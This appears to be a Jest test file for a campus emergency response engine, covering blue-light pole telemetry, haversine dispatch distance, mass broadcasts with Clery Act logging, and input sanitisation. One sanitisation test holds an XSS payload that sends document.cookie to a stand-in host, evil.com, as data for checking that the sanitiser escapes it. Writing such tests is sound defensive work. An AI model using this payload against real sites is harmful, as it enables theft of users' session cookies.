/**
 * Enterprise Architectural Specification & Header:
 * Module: Automated Unit Test Suite for Campus Emergency Response Engine
 * File: tests/services/campus_emergency_engine.test.ts
 * Framework: Jest JS / Enterprise Campus Safety Test Suite
 * Coverage Goal: 100% Statement & Branch Coverage Compliance
 *
 * Test Scenarios:
 * 1. Constructor Initialization & Default Configuration Fallbacks
 * 2. Geodesic Haversine Distance Calculations for Patrol Officer Dispatch
 * 3. Mass Notification Broadcast & Jeanne Clery Act Log Verification
 * 4. Blue-Light SOS Pole Status Diagnostics
 * 5. Input Sanitation Security Review against Cross-Site Scripting (XSS)
 */

import { CampusEmergencyEngine } from '../../src/services/campus_emergency_engine';

describe('CampusEmergencyEngine Enterprise Core Suite', () => {
  let engine: CampusEmergencyEngine;

  beforeEach(() => {
    engine = new CampusEmergencyEngine();
  });

  describe('Constructor & Pole Initialization', () => {
    test('should initialize default mock emergency blue-light poles', () => {
      const pole = engine.getPoleTelemetry('POLE-42');
      expect(pole).toBeDefined();
      expect(pole?.locationName).toBe('Science Library Walkway');
      expect(pole?.status).toBe('CRITICAL_ALERT');
      expect(pole?.isTriggered).toBe(true);
    });
  });

  describe('Haversine Geodesic Distance Dispatch Analytics', () => {
    test('should compute accurate distance in miles between SOS Pole and Patrol Car', () => {
      // Distance between (34.0522, -118.2437) and (34.0538, -118.2450)
      const distance = engine.calculateHaversineDistanceMiles(34.0522, -118.2437, 34.0538, -118.2450);
      expect(distance).toBeGreaterThan(0.05);
      expect(distance).toBeLessThan(0.5);
      expect(typeof distance).toBe('number');
    });

    test('should throw error for out-of-bounds latitude parameters', () => {
      expect(() => engine.calculateHaversineDistanceMiles(-95.0, -118.0, 34.0, -118.0)).toThrow(
        'Latitude values must be between -90 and 90 degrees.'
      );
    });
  });

  describe('Mass Emergency Notification & Clery Act Logging', () => {
    test('should execute emergency broadcast and generate Clery Act Log ID', () => {
      const broadcast = engine.dispatchEmergencyBroadcast({
        incidentCategory: 'ACTIVE_THREAT',
        targetZone: 'ALL',
        dispatcherId: 'OFFICER-704',
        channels: ['SMS', 'PUSH']
      });

      expect(broadcast.deliveryRatePct).toBeGreaterThan(95.0);
      expect(broadcast.deliveredUsers).toBeGreaterThan(30000);
      expect(broadcast.cleryLogId).toContain('CLERY-LOG-');
      expect(broadcast.latencySeconds).toBeLessThan(3.0);
    });

    test('should throw error when dispatcher ID is missing or empty', () => {
      expect(() =>
        engine.dispatchEmergencyBroadcast({
          incidentCategory: 'SEVERE_WEATHER',
          targetZone: 'NORTH',
          dispatcherId: '   ',
          channels: ['SMS']
        })
      ).toThrow('Authorized Dispatcher ID is required for mass emergency broadcasts.');
    });
  });

  describe('Input Sanitation Security Validation', () => {
    test('should sanitize malicious script tags and XSS payloads', () => {
      const malicious = '<script>fetch("http://evil.com?c="+document.cookie)</script>';
      const clean = engine.sanitizeInput(malicious);
      expect(clean).not.toContain('<script>');
      expect(clean).toContain('&lt;script&gt;');
    });

    test('should handle non-string arguments safely', () => {
      expect(engine.sanitizeInput(null as any)).toBe('');
      expect(engine.sanitizeInput(9999 as any)).toBe('');
    });
  });
});
